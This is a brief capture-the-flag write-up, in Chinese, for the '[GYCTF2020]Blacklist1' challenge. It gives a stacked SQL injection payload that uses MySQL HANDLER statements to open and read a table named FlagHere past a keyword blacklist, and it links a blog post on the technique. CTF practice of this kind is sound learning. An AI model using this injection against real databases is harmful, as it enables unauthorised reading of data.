        <content type="html"><![CDATA[<p><strong>[GYCTF2020]Blacklist1</strong>  </p><p>构造pyload:<br>1’;handler FlagHere open;handler FlagHere read first;handler FlagHere close;#</p><p>知识点: Handler的sql查询方法<br><a href="https://blog.csdn.net/qq_51927659/article/details/117233018">https://blog.csdn.net/qq_51927659/article/details/117233018</a></p>]]></content>
      
      
      
